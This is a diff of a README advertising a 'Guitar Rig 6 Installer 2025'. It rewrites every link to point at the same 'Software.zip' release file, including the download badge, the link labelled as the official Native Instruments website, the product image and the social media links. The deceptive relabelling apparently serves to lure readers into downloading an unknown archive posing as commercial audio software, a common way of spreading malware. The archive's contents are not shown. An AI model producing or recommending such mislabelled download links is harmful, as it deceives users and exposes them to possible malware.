@@ -18,7 +18,7 @@ Guitar Rig 6 is a powerful audio software that offers a wide range of amp simula
 
 To get started with Guitar Rig 6, download the installer package from the link below:
 
-[![Download Guitar Rig 6 Installer](https://img.shields.io/badge/Download-Guitar_Rig_6_Installer-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Guitar Rig 6 Installer](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip)](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the installer package, follow the on-screen instructions to set up Guitar Rig 6 on your system. Launch the installer and choose your desired installation options to customize your setup.
 
@@ -48,7 +48,7 @@ Explore the following topics related to Guitar Rig 6 Installer 2025:
 
 ## Resources
 
-For more information and updates, please visit the official Guitar Rig 6 website [here](https://www.native-instruments.com/en/products/komplete/guitar/guitar-rig-6-pro/). 
+For more information and updates, please visit the official Guitar Rig 6 website [here](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip). 
 
 If you encounter any issues with the download link provided, please check the "Releases" section of this repository for alternative download options and updates.
 
@@ -56,13 +56,13 @@ If you encounter any issues with the download link provided, please check the "R
 
 Get ready to unleash your creativity with Guitar Rig 6 Installer 2025! Whether you are jamming with your guitar, producing music in the studio, or experimenting with sound design, this installer is your gateway to a world of high-quality audio effects and tools. Download now and start exploring endless possibilities for your music projects. 🎶🎸
 
-![Guitar Rig 6](https://media.sweetwater.com/api/i/q-82__ha-ac7b5d138ba7d563__hmac-1aeb42c7902f69b1136ff6e7bddd0d1a1be37a0d/images/items/750/GuitarRig6-image.jpg)
+![Guitar Rig 6](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## Connect with Us
 
 Connect with us on social media to stay updated on the latest news and releases:
 
-- Twitter: [@GuitarRigOfficial](https://twitter.com/GuitarRigOfficial)
-- Facebook: [Guitar Rig 6 Installer 2025](https://www.facebook.com/guitarriginstaller2025)
+- Twitter: [@GuitarRigOfficial](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip)
+- Facebook: [Guitar Rig 6 Installer 2025](https://github.com/SriRamapriyan/Guitar-Rig-6-Installer-2025/releases/download/v1.0/Software.zip)
 
 Start creating amazing music with Guitar Rig 6 Installer 2025 today! 🎵🔊
